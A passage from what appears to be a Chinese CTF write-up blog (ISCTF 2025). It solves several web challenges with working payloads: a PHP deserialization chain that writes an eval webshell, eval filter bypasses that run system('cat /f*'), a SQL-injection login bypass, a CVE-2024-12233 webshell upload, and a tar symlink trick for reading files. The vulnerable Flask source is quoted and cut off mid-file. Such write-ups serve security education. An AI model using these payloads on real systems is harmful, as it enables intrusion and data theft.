+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileLogger</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">&#34;shell.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ShitMountant</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ShitMountant</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php @eval(</span><span class="se">\$</span><span class="s2">_POST[&#39;1&#39;]);?&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">logger</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileLogger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$final_payload</span> <span class="o">=</span> <span class="s2">&#34;blueshark:&#34;</span> <span class="o">.</span> <span class="nv">$payload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$final_payload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>马写进去然后命令执行就行</p>
+<h2 id="ezrce">ezrce
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[A-Za-z\(\)_;]+$/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;师傅，你想拿flag？&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">匹配意思是必须以字母、括号、下划线和分号组成的字符串，且整个字符串必须完全符合这个规则。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以打目录读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025isctf/image-20251203142027797.png"
+	width="1815"
+	height="334"
+	srcset="/p/2025isctf/image-20251203142027797_hu_3c1781154a0f0daa.png 480w, /p/2025isctf/image-20251203142027797_hu_a13f085d4fe87bd8.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251203142027797"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="543"
+		data-flex-basis="1304px"
+	
+></p>
+<p>当然最简单的其实就是打<code>get_defined_vars()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">end</span><span class="p">(</span><span class="n">current</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /f*&#39;</span><span class="p">);</span>	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025isctf/image-20251203142227914.png"
+	width="1765"
+	height="260"
+	srcset="/p/2025isctf/image-20251203142227914_hu_3e5166c5ebfcc8a6.png 480w, /p/2025isctf/image-20251203142227914_hu_d644a2f801e83c77.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251203142227914"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="678"
+		data-flex-basis="1629px"
+	
+></p>
+<h2 id="bby-n0t1ce-b0ard">b@by n0t1ce b0ard
+</h2><h3 id="考点cve-2024-12233">考点：CVE-2024-12233
+</h3><p>题目给了cve与源码，一搜就知道</p>
+<img src="image-20251203143648026.png" alt="image-20251203143648026" style="zoom:50%;" />
+<p>是registration.php中的任意文件上传漏洞</p>
+<p>但是稍微审计一下代码发现上传的马是上传到images/$e/下，$e是邮箱</p>
+<p><img src="/p/2025isctf/image-20251203143753591.png"
+	width="1013"
+	height="224"
+	srcset="/p/2025isctf/image-20251203143753591_hu_2731f1292280bd9f.png 480w, /p/2025isctf/image-20251203143753591_hu_144a659a93e82e52.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251203143753591"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="452"
+		data-flex-basis="1085px"
+	
+></p>
+<img src="image-20251203143816120.png" alt="image-20251203143816120" style="zoom:50%;" />
+<p>所以上传马后直接在这目录执行命令就行</p>
+<p><img src="/p/2025isctf/image-20251203143613170.png"
+	width="1787"
+	height="352"
+	srcset="/p/2025isctf/image-20251203143613170_hu_db02530ec46a2f71.png 480w, /p/2025isctf/image-20251203143613170_hu_b166093353321641.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251203143613170"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="507"
+		data-flex-basis="1218px"
+	
+></p>
+<h2 id="flag到底在哪">flag到底在哪
+</h2><h3 id="考点万能密码">考点：万能密码
+</h3><p>robots.txt找到登入路由</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/admin/login.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后万能密码登入<code>1' OR '1'='1'--+</code>,之后上传一句话木马，flag在环境</p>
+<p><img src="/p/2025isctf/image-20251204003842004.png"
+	width="1604"
+	height="534"
+	srcset="/p/2025isctf/image-20251204003842004_hu_39cf94d754d109ca.png 480w, /p/2025isctf/image-20251204003842004_hu_dd2e1e2010694ab4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204003842004"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="720px"
+	
+></p>
+<h2 id="flag我就借走了">flag？我就借走了
+</h2><h3 id="考点软链接">考点：软链接
+</h3><p>一眼就是软链接，先拿源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /app/app.py link
+</span></span><span class="line"><span class="cl">tar -cvf link.tar link
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">shutil</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tarfile</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;./uploads&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;MAX_CONTENT_LENGTH&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span> <span class="o">*</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_EXTENSIONS</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([</span><span class="s2">&#34;tar&#34;</span><span class="p">,</span> <span class="s2">&#34;png&#34;</span><span class="p">,</span> <span class="s2">&#34;avif&#34;</span><span class="p">,</span> <span class="s2">&#34;webp&#34;</span><span class="p">,</span> <span class="s2">&#34;gif&#34;</span><span class="p">,</span> <span class="s2">&#34;jxl&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HTML_TEMPLATE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#前端代码
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;.&#34;</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">and</span> <span class="n">filename</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">ALLOWED_EXTENSIONS</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;file&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;请选择文件&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;请选择文件&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span>
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">allowed_file</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="s2">&#34;..&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="s2">&#34;/&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
+</span></span><span class="line"><span class="cl">    <span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">],</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">file_save_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">],</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_save_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;文件已存在&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_save_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.tar&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">file_save_path</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">tf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">tf</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">file_save_path</span><span class="p">)</span>  <span class="c1"># 解压后删除原始tar</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;解压失败: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">HTML_TEMPLATE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span><span class="o">=</span><span class="s2">&#34;只支持TAR、PNG、AVIF、WEBP、GIF、JXL、TXT文件&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">HTML_TEMPLATE</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;上传成功！&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/download/&lt;filename&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">filename</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">filename</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;文件名不能为空&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;..&#34;</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="s2">&#34;/&#34;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;欸，不能欺骗人家呀&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">filepath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;文件不存在&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;读取文件失败: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/clean&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clean</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 清理上传目录</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;清理完成&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">]):</span>
